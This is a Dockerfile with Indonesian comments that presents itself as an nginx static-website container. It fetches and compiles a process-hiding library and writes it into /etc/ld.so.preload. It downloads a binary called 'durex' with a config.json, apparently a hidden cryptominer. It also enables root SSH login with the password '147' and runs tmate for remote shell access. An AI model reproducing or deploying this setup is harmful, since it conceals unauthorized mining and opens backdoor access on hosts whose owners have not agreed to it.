FROM debian
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt upgrade -y && apt install -y \
    ssh git wget nano curl python3 python3-pip tmate nginx
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
&& gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
&& mv libprocess.so /usr/local/lib/ \
&& echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload   
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
&& wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
&& chmod +x durex

# Menghapus default file konfigurasi Nginx
RUN rm -v /etc/nginx/nginx.conf

# Menyalin file konfigurasi Nginx kustom
COPY ./path/to/your/nginx.conf /etc/nginx/nginx.conf

# Menyalin file situs web statis ke dalam direktori container
COPY ./path/to/your/static/files /var/www/html

RUN mkdir /run/sshd \
    && echo "nginx", "-g", "daemon off;" >> /openssh.sh \
    && echo "sleep 5" >> /openssh.sh \
    && echo "tmate -F &" >>/openssh.sh \
    && echo '/usr/sbin/sshd -D' >>/openssh.sh \
    && echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config  \
    && echo root:147|chpasswd \
    && chmod 755 /openssh.sh

EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000
CMD /openssh.sh
